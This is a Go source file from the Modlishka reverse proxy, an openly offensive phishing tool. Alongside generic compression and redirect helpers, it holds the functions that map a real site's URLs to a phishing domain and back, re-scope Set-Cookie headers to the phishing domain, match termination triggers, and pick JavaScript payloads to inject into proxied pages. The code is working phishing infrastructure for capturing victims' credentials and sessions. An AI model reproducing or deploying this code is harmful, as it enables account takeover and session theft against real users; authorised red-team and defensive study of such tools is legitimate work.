/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package core

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"

	"github.com/drk1wi/Modlishka/log"
	"github.com/miekg/dns"
)

//GZIP content
func gzipBuffer(input []byte) []byte {

	var b bytes.Buffer
	gz := gzip.NewWriter(&b)
	if _, err := gz.Write(input); err != nil {
		panic(err)
	}
	if err := gz.Flush(); err != nil {
		panic(err)
	}
	if err := gz.Close(); err != nil {
		panic(err)
	}
	return b.Bytes()
}

//Deflate content
func deflateBuffer(input []byte) []byte {

	var b bytes.Buffer
	zz, err := flate.NewWriter(&b, 0)

	if err != nil {
		panic(err)
	}
	if _, err = zz.Write(input); err != nil {
		panic(err)
	}
	if err := zz.Flush(); err != nil {
		panic(err)
	}
	if err := zz.Close(); err != nil {
		panic(err)
	}
	return b.Bytes()
}

// Do a redirect
func Redirect(w http.ResponseWriter, r *http.Request, url string) {
	if len(url) > 0 {
		http.Redirect(w, r, url, 301)
	} else {
		http.Redirect(w, r, "http://"+TopLevelDomain, 301)
	}
}

//check if the requested URL matches termination URLS patterns and returns verdict
func CheckTermination(input string) bool {

	if len(TerminateTriggers) > 0 {
		for _, pattern := range TerminateTriggers {
			if strings.Contains(input, pattern) {
				return true
			}
		}
	}
	return false
}

func TranslateRequestHost(newTarget, host string) string {

	sub := strings.Replace(host, PhishingDomain, "", -1)
	if sub != "" {
		log.Debugf("Subdomain: %s ", sub[:len(sub)-1])

		decoded, err := DecodeSubdomain(sub[:len(sub)-1])
		if err == nil {
			if _, ok := dns.IsDomainName(string(decoded)); ok {
				log.Debugf("Subdomain contains encrypted base32  domain: %s ", string(decoded))
				newTarget = "https://" + string(decoded)
			}

		} else { //not hex encoded, treat as normal subdomain
			log.Debugf("Standard subdomain: %s ", sub[:len(sub)-1])
			newTarget = "https://" + sub[:len(sub)-1] + "." + TopLevelDomain
		}
	}

	return newTarget
}

func TranslateSetCookie(cookie string) string {
	ret := RegexpSetCookie.ReplaceAllStringFunc(cookie, RealURLtoPhish)

	return ret

}
func RealURLtoPhish(realURL string) string {

	//var domain string
	var host string
	var out string

	decoded := fmt.Sprintf("%s", realURL)
	u, _ := url.Parse(decoded)
	out = realURL

	if u.Host != "" {
		host = u.Host
	} else {
		host = realURL
	}

	if strings.Contains(realURL, TopLevelDomain) { //subdomain in main domain
		out = strings.Replace(out, string(TopLevelDomain), PhishingDomain, 1)
	} else if realURL != "" {
		encoded, _ := EncodeSubdomain(host)
		out = strings.Replace(out, host, encoded+"."+PhishingDomain, 1)
	}

	return out
}

func PhishURLToRealURL(phishURL string) string {

	//var domain string

	var host string
	var out string

	u, _ := url.Parse(phishURL)
	out = phishURL

	// Parse both cases with http url scheme and without
	if u.Host != "" {
		host = u.Host
	} else {
		host = phishURL
	}

	if strings.Contains(phishURL, PhishingDomain) {
		subdomain := strings.Replace(host, "."+PhishingDomain, "", 1)
		// has subdomain
		if len(subdomain) > 0 {
			decodedDomain, err := DecodeSubdomain(subdomain)
			if err != nil {
				return strings.Replace(out, PhishingDomain, TopLevelDomain, 1)
			}

			return string(decodedDomain)
		}

		return strings.Replace(out, PhishingDomain, TopLevelDomain, -1)
	}

	return out
}

func StripProtocol(URL string) string {
	var re = regexp.MustCompile(`^(http|https)://`)
	return re.ReplaceAllString(URL, "")
}

// returns JS payload based on a pattern
func GetJSRulesPayload(input string) string {

	if len(JSInjectStrings) > 0 {

		for key, _ := range JSInjectStrings {
			if strings.Contains(input, key) {
				return JSInjectStrings[key]
			}
		}
	}

	return ""
}
